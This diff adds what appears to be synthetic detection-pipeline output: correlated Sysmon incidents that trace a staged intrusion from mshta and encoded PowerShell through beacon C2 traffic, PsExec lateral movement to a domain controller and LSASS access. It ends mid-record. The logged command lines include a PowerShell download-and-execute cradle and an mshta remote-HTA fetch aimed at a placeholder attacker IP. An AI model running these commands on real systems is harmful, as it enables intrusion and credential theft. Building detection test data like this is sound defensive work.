@@ -1,0 +1,1192 @@
+[
+  {
+    "incident_id": "ff28c56a-4f9f-40c3-b011-1055648060d9",
+    "score": 0.4714,
+    "severity": "medium",
+    "start_time": "2026-10-28T09:05:10+00:00",
+    "end_time": "2026-10-28T09:14:30+00:00",
+    "techniques": [
+      "T1021.002",
+      "T1570"
+    ],
+    "tactics": [
+      "lateral tool transfer",
+      "lateral_movement"
+    ],
+    "hosts": [
+      "DC01.corp.local",
+      "SERVER01.corp.local"
+    ],
+    "users": [
+      "NT AUTHORITY\\SYSTEM"
+    ],
+    "alert_count": 6,
+    "alerts": [
+      {
+        "rule_id": "15a94696-559f-4815-b95c-6c890a064352",
+        "rule_name": "technique_id=T1021.002,technique_name=SMB/Windows Admin Shares",
+        "mitre_technique": "T1021.002",
+        "mitre_tactic": "lateral_movement",
+        "timestamp": "2026-10-28T09:05:10+00:00",
+        "hostname": "SERVER01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "high",
+        "raw_event": {
+          "_comment": "PHASE 4: PsExec service installed on SERVER01",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "SERVER01.corp.local",
+          "TimeCreated": "2026-10-28T09:05:10.0000000Z",
+          "ProcessId": 2100,
+          "ProcessGUID": "{bbbb0001-0001-6720-0200-000000010000}",
+          "Image": "C:\\Windows\\PSEXESVC.exe",
+          "CommandLine": "C:\\Windows\\PSEXESVC.exe",
+          "CurrentDirectory": "C:\\Windows\\",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "LogonGuid": "{bbbb0001-0000-6720-0200-000000000001}",
+          "LogonId": "0x3E7",
+          "TerminalSessionId": 0,
+          "IntegrityLevel": "System",
+          "Hashes": "SHA256=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD",
+          "ParentProcessId": 668,
+          "ParentProcessGUID": "{bbbb0001-0000-6720-0200-000000000010}",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\services.exe",
+          "ParentUser": "NT AUTHORITY\\SYSTEM",
+          "RuleName": "technique_id=T1021.002,technique_name=SMB/Windows Admin Shares"
+        },
+        "process_guid": "{bbbb0001-0001-6720-0200-000000010000}",
+        "parent_process_guid": "{bbbb0001-0000-6720-0200-000000000010}",
+        "logon_id": "0x3E7",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "8c9dec43-4f3f-46e5-a000-0cd190177005"
+      },
+      {
+        "rule_id": "8b58d6a0-96fb-41d2-b244-ef0fec52f1c5",
+        "rule_name": "technique_id=T1570,technique_name=Lateral Tool Transfer",
+        "mitre_technique": "T1570",
+        "mitre_tactic": "lateral tool transfer",
+        "timestamp": "2026-10-28T09:05:15+00:00",
+        "hostname": "SERVER01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 4: Beacon deployed and executed on SERVER01 via PsExec",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "SERVER01.corp.local",
+          "TimeCreated": "2026-10-28T09:05:15.0000000Z",
+          "ProcessId": 2200,
+          "ProcessGUID": "{bbbb0001-0002-6720-0200-000000020000}",
+          "Image": "C:\\Windows\\Temp\\beacon2.exe",
+          "CommandLine": "C:\\Windows\\Temp\\beacon2.exe",
+          "CurrentDirectory": "C:\\Windows\\Temp\\",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "LogonGuid": "{bbbb0001-0000-6720-0200-000000000001}",
+          "LogonId": "0x3E7",
+          "TerminalSessionId": 0,
+          "IntegrityLevel": "System",
+          "Hashes": "SHA256=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
+          "ParentProcessId": 2100,
+          "ParentProcessGUID": "{bbbb0001-0001-6720-0200-000000010000}",
+          "ParentImage": "C:\\Windows\\PSEXESVC.exe",
+          "ParentCommandLine": "C:\\Windows\\PSEXESVC.exe",
+          "ParentUser": "NT AUTHORITY\\SYSTEM",
+          "RuleName": "technique_id=T1570,technique_name=Lateral Tool Transfer"
+        },
+        "process_guid": "{bbbb0001-0002-6720-0200-000000020000}",
+        "parent_process_guid": "{bbbb0001-0001-6720-0200-000000010000}",
+        "logon_id": "0x3E7",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "e2850cdf-b4b0-43f7-9efa-470648b5188a"
+      },
+      {
+        "rule_id": "d89e59ce-f4ab-42c4-ae58-d0a76dce7dfc",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:05:20+00:00",
+        "hostname": "SERVER01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 4: Beacon on SERVER01 connects to C2",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "SERVER01.corp.local",
+          "TimeCreated": "2026-10-28T09:05:20.0000000Z",
+          "ProcessId": 2200,
+          "ProcessGUID": "{bbbb0001-0002-6720-0200-000000020000}",
+          "Image": "C:\\Windows\\Temp\\beacon2.exe",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.20",
+          "SourceHostname": "SERVER01.corp.local",
+          "SourcePort": 50100,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "203.0.113.100",
+          "DestinationHostname": "",
+          "DestinationPort": 443,
+          "DestinationPortName": "https",
+          "LogonId": "0x3E7"
+        },
+        "process_guid": "{bbbb0001-0002-6720-0200-000000020000}",
+        "parent_process_guid": "",
+        "logon_id": "0x3E7",
+        "source_ip": "10.0.1.20",
+        "dest_ip": "203.0.113.100",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "0769ecfa-dce1-4c4d-a16e-6ddbeaf05c26"
+      },
+      {
+        "rule_id": "b4e19361-2c00-42f1-8c36-e64ca6f40163",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:10:00+00:00",
+        "hostname": "SERVER01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 5: Lateral Movement to DC01 \u2014 network connection from SERVER01",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "SERVER01.corp.local",
+          "TimeCreated": "2026-10-28T09:10:00.0000000Z",
+          "ProcessId": 2200,
+          "ProcessGUID": "{bbbb0001-0002-6720-0200-000000020000}",
+          "Image": "C:\\Windows\\Temp\\beacon2.exe",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.20",
+          "SourceHostname": "SERVER01.corp.local",
+          "SourcePort": 50200,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "10.0.1.1",
+          "DestinationHostname": "DC01.corp.local",
+          "DestinationPort": 445,
+          "DestinationPortName": "microsoft-ds",
+          "LogonId": "0x3E7"
+        },
+        "process_guid": "{bbbb0001-0002-6720-0200-000000020000}",
+        "parent_process_guid": "",
+        "logon_id": "0x3E7",
+        "source_ip": "10.0.1.20",
+        "dest_ip": "10.0.1.1",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "39fdd929-5a06-4a91-a954-9d0c2df5e011"
+      },
+      {
+        "rule_id": "b36189d7-bc2b-4582-bc78-5deec075066d",
+        "rule_name": "technique_id=T1021.002,technique_name=SMB/Windows Admin Shares",
+        "mitre_technique": "T1021.002",
+        "mitre_tactic": "lateral_movement",
+        "timestamp": "2026-10-28T09:10:10+00:00",
+        "hostname": "DC01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "high",
+        "raw_event": {
+          "_comment": "PHASE 5: Service install on DC01 \u2014 DCSync or similar",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "DC01.corp.local",
+          "TimeCreated": "2026-10-28T09:10:10.0000000Z",
+          "ProcessId": 1500,
+          "ProcessGUID": "{cccc0001-0001-6720-0300-000000010000}",
+          "Image": "C:\\Windows\\Temp\\beacon3.exe",
+          "CommandLine": "C:\\Windows\\Temp\\beacon3.exe",
+          "CurrentDirectory": "C:\\Windows\\Temp\\",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "LogonGuid": "{cccc0001-0000-6720-0300-000000000001}",
+          "LogonId": "0x3E7",
+          "TerminalSessionId": 0,
+          "IntegrityLevel": "System",
+          "Hashes": "SHA256=FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
+          "ParentProcessId": 668,
+          "ParentProcessGUID": "{cccc0001-0000-6720-0300-000000000010}",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\services.exe",
+          "ParentUser": "NT AUTHORITY\\SYSTEM",
+          "RuleName": "technique_id=T1021.002,technique_name=SMB/Windows Admin Shares"
+        },
+        "process_guid": "{cccc0001-0001-6720-0300-000000010000}",
+        "parent_process_guid": "{cccc0001-0000-6720-0300-000000000010}",
+        "logon_id": "0x3E7",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "27324dbb-38c1-48e3-adfa-3c3fe75c87ff"
+      },
+      {
+        "rule_id": "f9719032-a766-4ca1-9ed2-8e09815fc72d",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:14:30+00:00",
+        "hostname": "DC01.corp.local",
+        "username": "NT AUTHORITY\\SYSTEM",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 5: Beacon on DC01 connects to C2",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "DC01.corp.local",
+          "TimeCreated": "2026-10-28T09:14:30.0000000Z",
+          "ProcessId": 1500,
+          "ProcessGUID": "{cccc0001-0001-6720-0300-000000010000}",
+          "Image": "C:\\Windows\\Temp\\beacon3.exe",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.1",
+          "SourceHostname": "DC01.corp.local",
+          "SourcePort": 51000,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "203.0.113.100",
+          "DestinationHostname": "",
+          "DestinationPort": 443,
+          "DestinationPortName": "https",
+          "LogonId": "0x3E7"
+        },
+        "process_guid": "{cccc0001-0001-6720-0300-000000010000}",
+        "parent_process_guid": "",
+        "logon_id": "0x3E7",
+        "source_ip": "10.0.1.1",
+        "dest_ip": "203.0.113.100",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "bae6221b-e9f9-47ff-a07a-f10313f98ee3"
+      }
+    ],
+    "entities": [
+      {
+        "entity_type": "user",
+        "entity_id": "nt authority\\system",
+        "attributes": {
+          "domain": "nt authority",
+          "samaccountname": "system",
+          "is_machine_account": false
+        }
+      },
+      {
+        "entity_type": "logon_session",
+        "entity_id": "server01.corp.local|0x3e7",
+        "attributes": {
+          "hostname": "SERVER01.corp.local"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "203.0.113.100",
+        "attributes": {
+          "direction": "destination"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.20",
+        "attributes": {
+          "direction": "destination"
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "server01.corp.local|{bbbb0001-0000-6720-0200-000000000010}",
+        "attributes": {
+          "hostname": "SERVER01.corp.local",
+          "raw_guid": "{bbbb0001-0000-6720-0200-000000000010}",
+          "is_parent": true
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "server01.corp.local|{bbbb0001-0001-6720-0200-000000010000}",
+        "attributes": {
+          "hostname": "SERVER01.corp.local",
+          "raw_guid": "{bbbb0001-0001-6720-0200-000000010000}"
+        }
+      },
+      {
+        "entity_type": "host",
+        "entity_id": "server01.corp.local",
+        "attributes": {}
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "dc01.corp.local|{cccc0001-0001-6720-0300-000000010000}",
+        "attributes": {
+          "hostname": "DC01.corp.local",
+          "raw_guid": "{cccc0001-0001-6720-0300-000000010000}"
+        }
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "dc01.corp.local|{cccc0001-0000-6720-0300-000000000010}",
+        "attributes": {
+          "hostname": "DC01.corp.local",
+          "raw_guid": "{cccc0001-0000-6720-0300-000000000010}",
+          "is_parent": true
+        }
+      },
+      {
+        "entity_type": "logon_session",
+        "entity_id": "dc01.corp.local|0x3e7",
+        "attributes": {
+          "hostname": "DC01.corp.local"
+        }
+      },
+      {
+        "entity_type": "host",
+        "entity_id": "dc01.corp.local",
+        "attributes": {}
+      },
+      {
+        "entity_type": "process",
+        "entity_id": "server01.corp.local|{bbbb0001-0002-6720-0200-000000020000}",
+        "attributes": {
+          "hostname": "SERVER01.corp.local",
+          "raw_guid": "{bbbb0001-0002-6720-0200-000000020000}"
+        }
+      },
+      {
+        "entity_type": "ip",
+        "entity_id": "10.0.1.1",
+        "attributes": {
+          "direction": "destination"
+        }
+      }
+    ],
+    "blast_radius": {
+      "hosts_touched": 2,
+      "accounts_used": 1,
+      "privilege_level_reached": "high",
+      "lateral_movement_hops": 1
+    },
+    "playbook_recommendations": [
+      "playbooks/lateral_movement.yml"
+    ]
+  },
+  {
+    "incident_id": "20d9ea35-6212-4805-a901-b3a4002f483a",
+    "score": 0.4443,
+    "severity": "medium",
+    "start_time": "2026-10-28T09:00:00+00:00",
+    "end_time": "2026-10-28T09:05:00+00:00",
+    "techniques": [
+      "T1003.001",
+      "T1059.001",
+      "T1204.002",
+      "T1218.005"
+    ],
+    "tactics": [
+      "credential_access",
+      "defense_evasion",
+      "execution"
+    ],
+    "hosts": [
+      "WORKSTATION01.corp.local"
+    ],
+    "users": [
+      "CORP\\victim"
+    ],
+    "alert_count": 11,
+    "alerts": [
+      {
+        "rule_id": "17b01825-b118-4778-8c52-dd063330d8c6",
+        "rule_name": "technique_id=T1218.005,technique_name=Mshta",
+        "mitre_technique": "T1218.005",
+        "mitre_tactic": "defense_evasion",
+        "timestamp": "2026-10-28T09:00:00+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "high",
+        "raw_event": {
+          "_comment": "PHASE 1: Initial Access \u2014 mshta executing HTA from external URL on WORKSTATION01",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:00.0000000Z",
+          "ProcessId": 4100,
+          "ProcessGUID": "{aaaa0001-0001-6720-0100-000000010000}",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "CommandLine": "mshta.exe http://203.0.113.100/stage1.hta",
+          "CurrentDirectory": "C:\\Users\\victim\\",
+          "User": "CORP\\victim",
+          "LogonGuid": "{aaaa0001-0000-6720-0100-000000000001}",
+          "LogonId": "0x1A2B3C",
+          "TerminalSessionId": 1,
+          "IntegrityLevel": "Medium",
+          "Hashes": "SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "ParentProcessId": 3000,
+          "ParentProcessGUID": "{aaaa0001-0000-6720-0100-000000000500}",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\explorer.exe",
+          "ParentUser": "CORP\\victim",
+          "SourceIp": null,
+          "DestinationIp": null,
+          "RuleName": "technique_id=T1218.005,technique_name=Mshta"
+        },
+        "process_guid": "{aaaa0001-0001-6720-0100-000000010000}",
+        "parent_process_guid": "{aaaa0001-0000-6720-0100-000000000500}",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "5242218f-e623-4fcd-8168-c8f65e12bb60"
+      },
+      {
+        "rule_id": "941899fe-0f62-487b-9459-81f31846b616",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:00:01+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 1: Network connection from mshta to C2",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:01.0000000Z",
+          "ProcessId": 4100,
+          "ProcessGUID": "{aaaa0001-0001-6720-0100-000000010000}",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "User": "CORP\\victim",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.10",
+          "SourceHostname": "WORKSTATION01.corp.local",
+          "SourcePort": 49152,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "203.0.113.100",
+          "DestinationHostname": "",
+          "DestinationPort": 80,
+          "DestinationPortName": "http",
+          "LogonId": "0x1A2B3C"
+        },
+        "process_guid": "{aaaa0001-0001-6720-0100-000000010000}",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "10.0.1.10",
+        "dest_ip": "203.0.113.100",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "2086a99f-d541-4a42-8e37-372bc830e94b"
+      },
+      {
+        "rule_id": "8e3414c7-088f-431e-b011-f541db582d23",
+        "rule_name": "technique_id=T1059.001,technique_name=PowerShell",
+        "mitre_technique": "T1059.001",
+        "mitre_tactic": "execution",
+        "timestamp": "2026-10-28T09:00:15+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "high",
+        "raw_event": {
+          "_comment": "PHASE 2: Execution \u2014 mshta spawns PowerShell (child process)",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:15.0000000Z",
+          "ProcessId": 4200,
+          "ProcessGUID": "{aaaa0001-0002-6720-0100-000000020000}",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAAMAAvAHMAMgAuAHAAcwAxACcAKQA=",
+          "CurrentDirectory": "C:\\Users\\victim\\",
+          "User": "CORP\\victim",
+          "LogonGuid": "{aaaa0001-0000-6720-0100-000000000001}",
+          "LogonId": "0x1A2B3C",
+          "TerminalSessionId": 1,
+          "IntegrityLevel": "Medium",
+          "Hashes": "SHA256=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
+          "ParentProcessId": 4100,
+          "ParentProcessGUID": "{aaaa0001-0001-6720-0100-000000010000}",
+          "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+          "ParentCommandLine": "mshta.exe http://203.0.113.100/stage1.hta",
+          "ParentUser": "CORP\\victim",
+          "RuleName": "technique_id=T1059.001,technique_name=PowerShell"
+        },
+        "process_guid": "{aaaa0001-0002-6720-0100-000000020000}",
+        "parent_process_guid": "{aaaa0001-0001-6720-0100-000000010000}",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "46f3c43f-6fb8-4d30-8f82-d15afb947519"
+      },
+      {
+        "rule_id": "f074e8e7-6cf1-444e-bfd7-45eb7c439781",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:00:16+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 2: PowerShell connects to C2 for stage 2 payload",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:16.0000000Z",
+          "ProcessId": 4200,
+          "ProcessGUID": "{aaaa0001-0002-6720-0100-000000020000}",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "User": "CORP\\victim",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.10",
+          "SourceHostname": "WORKSTATION01.corp.local",
+          "SourcePort": 49200,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "203.0.113.100",
+          "DestinationHostname": "",
+          "DestinationPort": 443,
+          "DestinationPortName": "https",
+          "LogonId": "0x1A2B3C"
+        },
+        "process_guid": "{aaaa0001-0002-6720-0100-000000020000}",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "10.0.1.10",
+        "dest_ip": "203.0.113.100",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "d34fde9c-c453-4e34-b3c5-795937477368"
+      },
+      {
+        "rule_id": "4ab0183a-1cad-495d-a50c-6da5ae985a93",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:00:17+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 2: PowerShell scriptblock logging \u2014 encoded command decoded",
+          "EventType": "ScriptBlockLogging",
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:17.0000000Z",
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.100/s2.ps1')",
+          "ScriptBlockId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "User": "CORP\\victim",
+          "LogonId": "0x1A2B3C",
+          "ProcessId": 4200
+        },
+        "process_guid": "",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "db8ab743-a1f8-4bba-9671-f18b07d97224"
+      },
+      {
+        "rule_id": "2ec18284-c883-4d40-aa18-f735b9dc8b3c",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:00:30+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 2: PowerShell drops a binary to disk",
+          "EventType": "FileCreate",
+          "EventID": 11,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:30.0000000Z",
+          "ProcessId": 4200,
+          "ProcessGUID": "{aaaa0001-0002-6720-0100-000000020000}",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetFilename": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "CreationUtcTime": "2026-10-28T09:00:30.0000000Z",
+          "User": "CORP\\victim",
+          "LogonId": "0x1A2B3C"
+        },
+        "process_guid": "{aaaa0001-0002-6720-0100-000000020000}",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "0f3888b4-05d6-4ea8-8170-a3de65abe5d3"
+      },
+      {
+        "rule_id": "fd7a11c1-dafb-4810-9c20-ef20dcbf4b30",
+        "rule_name": "technique_id=T1204.002,technique_name=User Execution: Malicious File",
+        "mitre_technique": "T1204.002",
+        "mitre_tactic": "execution",
+        "timestamp": "2026-10-28T09:00:45+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 2: Beacon executable spawned by PowerShell",
+          "EventType": "ProcessCreate",
+          "EventID": 1,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:45.0000000Z",
+          "ProcessId": 4300,
+          "ProcessGUID": "{aaaa0001-0003-6720-0100-000000030000}",
+          "Image": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "CommandLine": "beacon.exe",
+          "CurrentDirectory": "C:\\Users\\victim\\AppData\\Local\\Temp\\",
+          "User": "CORP\\victim",
+          "LogonGuid": "{aaaa0001-0000-6720-0100-000000000001}",
+          "LogonId": "0x1A2B3C",
+          "TerminalSessionId": 1,
+          "IntegrityLevel": "Medium",
+          "Hashes": "SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC",
+          "ParentProcessId": 4200,
+          "ParentProcessGUID": "{aaaa0001-0002-6720-0100-000000020000}",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",
+          "ParentUser": "CORP\\victim",
+          "RuleName": "technique_id=T1204.002,technique_name=User Execution: Malicious File"
+        },
+        "process_guid": "{aaaa0001-0003-6720-0100-000000030000}",
+        "parent_process_guid": "{aaaa0001-0002-6720-0100-000000020000}",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "",
+        "dest_ip": "",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "72ee4e21-b6bc-4c08-ac6b-7d9881f45f68"
+      },
+      {
+        "rule_id": "0baa0981-72c8-4d0f-b0e1-8794ff344a36",
+        "rule_name": "Security Alert",
+        "mitre_technique": "",
+        "mitre_tactic": "",
+        "timestamp": "2026-10-28T09:00:50+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "CORP\\victim",
+        "severity": "medium",
+        "raw_event": {
+          "_comment": "PHASE 2: Beacon establishes C2 connection",
+          "EventType": "NetworkConnect",
+          "EventID": 3,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:00:50.0000000Z",
+          "ProcessId": 4300,
+          "ProcessGUID": "{aaaa0001-0003-6720-0100-000000030000}",
+          "Image": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "User": "CORP\\victim",
+          "Protocol": "tcp",
+          "Initiated": true,
+          "SourceIsIpv6": false,
+          "SourceIp": "10.0.1.10",
+          "SourceHostname": "WORKSTATION01.corp.local",
+          "SourcePort": 49300,
+          "DestinationIsIpv6": false,
+          "DestinationIp": "203.0.113.100",
+          "DestinationHostname": "",
+          "DestinationPort": 443,
+          "DestinationPortName": "https",
+          "LogonId": "0x1A2B3C"
+        },
+        "process_guid": "{aaaa0001-0003-6720-0100-000000030000}",
+        "parent_process_guid": "",
+        "logon_id": "0x1A2B3C",
+        "source_ip": "10.0.1.10",
+        "dest_ip": "203.0.113.100",
+        "network_session_id": "",
+        "extra": {},
+        "alert_id": "8a50bb6c-d99e-496e-9eca-7d60fb10aaf2"
+      },
+      {
+        "rule_id": "9d1d22e6-dbe6-4d83-a846-ad6041764d76",
+        "rule_name": "technique_id=T1003.001,technique_name=LSASS Memory",
+        "mitre_technique": "T1003.001",
+        "mitre_tactic": "credential_access",
+        "timestamp": "2026-10-28T09:02:00+00:00",
+        "hostname": "WORKSTATION01.corp.local",
+        "username": "",
+        "severity": "critical",
+        "raw_event": {
+          "_comment": "PHASE 3: Credential Access \u2014 beacon accesses LSASS for credential dump",
+          "EventType": "ProcessAccess",
+          "EventID": 10,
+          "Channel": "Microsoft-Windows-Sysmon/Operational",
+          "Computer": "WORKSTATION01.corp.local",
+          "TimeCreated": "2026-10-28T09:02:00.0000000Z",
+          "SourceProcessId": 4300,
+          "SourceProcessGUID": "{aaaa0001-0003-6720-0100-000000030000}",
+          "SourceImage": "C:\\Users\\victim\\AppData\\Local\\Temp\\beacon.exe",
+          "SourceUser": "CORP\\victim",
+          "TargetProcessId": 672,
+          "TargetProcessGUID": "{aaaa0001-0000-6720-0100-000000000050}",
+          "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+          "TargetUser": "NT AUTHORITY\\SYSTEM",
+          "GrantedAccess": "0x1010",
